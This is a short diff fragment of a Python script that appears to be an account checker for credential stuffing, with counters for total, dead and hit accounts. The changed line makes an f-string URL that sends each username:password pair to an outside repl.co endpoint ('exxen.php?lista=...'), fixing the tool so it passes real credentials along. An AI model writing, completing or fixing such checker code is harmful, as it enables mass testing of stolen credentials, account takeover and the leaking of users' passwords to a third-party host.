@@ -581,7 +581,7 @@ Kod: {kod9}
                         toplam=0
                         olu=0
                         hit=0
-                        url="https://7b136369-58ae-4c2a-8055-792922d40b03.id.repl.co/exxen.php?lista={user}:{pas}"
+                        url=f"https://7b136369-58ae-4c2a-8055-792922d40b03.id.repl.co/exxen.php?lista={user}:{pas}"
                         try:
                             sesi=requests.Session()
                             try:
